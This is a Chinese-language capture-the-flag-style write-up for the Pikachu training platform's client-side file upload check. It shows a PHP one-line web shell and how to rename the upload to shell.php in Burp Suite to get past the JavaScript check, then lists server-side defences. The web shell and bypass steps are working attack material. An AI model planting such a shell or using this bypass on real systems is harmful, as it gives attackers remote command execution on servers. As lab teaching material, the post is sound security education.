---
layout: post
title: "Pikachu - Unsafe Fileupload client check"
date: 2026-11-04
categories: pikachu
tags: [pikachu, web, 文件上传, 前端绕过]
permalink: /pikachu/upload-client-check.html
---

## 一、题目信息
- 平台：Pikachu
- 分类：Unsafe Fileupload -> 客户端check
- 难度：简单
- 通关标识：成功绕过前端 JS 验证，上传 `.php` 脚本文件。

## 二、大白话原理讲解
后端服务器其实是个“瞎子”，它根本不知道你传了什么。是前端网页上的 JavaScript 代码（保安）拦住了你，不让你选 `.php` 文件。
只要我们把文件后缀改一改，骗过保安，或者用抓包工具直接越过保安把文件递给后台，就能上传恶意代码。

## 三、解题步骤

**1. 准备 Payload**
在本地新建一个 `shell.php`，内容写一句话木马：
```php
<?php @eval($_POST['cmd']); ?>
```

**2. 抓包修改后缀**
开启 Burp Suite 拦截。在网页上选择一个正常的图片（如 `test.jpg`），点击开始上传。
在 Burp 抓到的请求中，找到请求体：
```http
Content-Disposition: form-data; name="uploadfile"; filename="test.jpg"
Content-Type: image/jpeg
```
将 `filename="test.jpg"` 修改为：
```http
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
```

**3. 验证结果**
点击放行请求，网页提示上传成功，并返回了文件路径（如 `upload/shell.php`）。证明成功绕过了客户端校验。

## 四、知识点解析
1. **客户端校验**：依靠前端 JavaScript 检查文件后缀，这种防御形同虚设，因为攻击者可以随意修改前端的 JS 代码或使用抓包工具直接发送原始 HTTP 请求。
2. **危害**：上传了 PHP 木马，意味着攻击者可以通过此木马执行任意系统命令，直接控制整个服务器。

## 五、总结与防御
**本题总结**：
任何仅在前端进行的校验都是不可信的。后端必须进行二次校验。

**安全防御建议**：
- **后端二次验证**：服务器必须检查文件的扩展名、MIME 类型、文件头（魔数）。
- **白名单限制**：只允许上传特定格式的图片（如 jpg、png）。
- **重命名文件**：上传后随机重命名文件，并修改文件权限，禁止执行权限。
